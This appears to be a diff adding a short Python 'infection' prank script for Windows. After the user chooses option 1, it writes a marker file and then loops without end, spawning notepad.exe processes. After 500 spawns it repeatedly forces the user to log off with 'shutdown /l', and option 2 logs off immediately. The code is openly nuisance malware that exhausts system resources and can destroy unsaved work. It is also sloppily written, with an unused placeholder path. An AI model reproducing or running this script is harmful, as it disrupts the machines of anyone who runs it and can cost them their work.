@@ -1,0 +1,29 @@
+ll=0
+print("Welcome")
+while True:
+    gat=int(input("1=Launch"))
+    if gat==1:
+        print("Creating: ")
+        f = open("SystemX48MWL.txt", "w")
+        f.write("Error404")
+        f.close()
+        f = open("SystemX48MWL.txt", "r")
+        if (f.read())=="Error404":
+            print("Good Luck=D")
+            while True:
+                print("Infecting!!!")
+                import subprocess
+                path=r'path/to/your/file.txt'
+                subprocess.Popen(['notepad.exe'])
+                if ll>=(500):
+                    subprocess.run(["shutdown", "/l"])
+                else:
+                    ll+=1
+        f = open("SystemX48MWL.txt", "r")
+        print(f.read())
+    elif gat==2:
+        print("Write open: ")
+        import subprocess
+        subprocess.run(["shutdown", "/l"])
+    else:
+        print("")
